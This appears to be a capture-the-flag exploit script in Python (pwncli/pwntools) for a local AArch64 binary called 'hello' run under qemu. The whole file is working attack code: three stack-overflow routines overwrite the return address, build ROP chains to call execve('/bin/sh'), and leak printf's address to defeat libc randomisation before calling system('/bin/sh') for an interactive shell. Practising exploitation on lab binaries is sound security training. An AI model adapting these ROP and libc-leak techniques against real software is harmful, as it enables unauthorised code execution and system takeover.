from pwncli import * # type:ignore
import argparse

context.binary = './hello'
context.log_level = 'debug'

debug = False

args = argparse.ArgumentParser(description='Exploit Script')
args.add_argument('--debug', action='store_true', help='Run in debug mode')
if args.parse_args().debug:
    debug = True

if debug:
    gift.io = process(['qemu-aarch64', '-g', '1234', '-L', '../lib', './hello'])
else:
    gift.io = process(['qemu-aarch64', '-L', '../lib', './hello'])

gift.elf = ELF('./hello')
gift.libc = ELF('../lib/lib64/libc-2.27.so')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

def ret2text():
    back_door = 0x4007CC
    ru("Enter a string: ")
    if debug: pause()
    s(flat([cyclic(0x20), p64(back_door)]))
    if debug: pause()
    ru("\n")

def ret2syscall():
    ldp_x0123_lr_ret = 0x4007F0
    ldp_x8_lr_ret = 0x400800
    svc = 0x400808
    bin_sh = 0x400A10
    ru("Enter a string: ")
    if debug: pause()
    s(flat([cyclic(0x20), 
            p64(ldp_x0123_lr_ret),
            p64(bin_sh), p64(0), p64(0), p64(0),
            p64(ldp_x8_lr_ret),
            p64(constants.SYS_execve), p64(svc)])) # type: ignore
    if debug: pause()
    ru("\n")

def ret2libc():
    ldp_x0123_lr_ret = 0x4007F0
    ldp_x3_lr_bx_x3 = 0x40080C
    printf_plt = elf.plt['printf']
    printf_got = elf.got['printf']
    start_addr = 0x4006D0

    ru("Enter a string: ")
    if debug: pause()
    s(flat([cyclic(0x20), 
            p64(ldp_x0123_lr_ret),
            p64(printf_got), p64(0), p64(0), p64(0),
            p64(ldp_x3_lr_bx_x3),
            p64(printf_plt), p64(start_addr)]))
    if debug: pause()
    ru("\n")

    printf_addr = u64(r(6).ljust(8, b'\x00'))
    libc.address = printf_addr - libc.symbols['printf']
    success(f"printf_addr ==> {hex(printf_addr)}")
    success(f"libc_addr ==> {hex(libc.address)}")

    ru("Enter a string: ")
    if debug: pause()
    s(flat([cyclic(0x20), 
            p64(ldp_x0123_lr_ret),
            p64(next(libc.search(b'/bin/sh\x00'))), p64(0), p64(0), p64(0),
            p64(libc.sym['system'])]))
    if debug: pause()
    ru("\n")

if __name__ == '__main__':
    ret2libc()
    ia()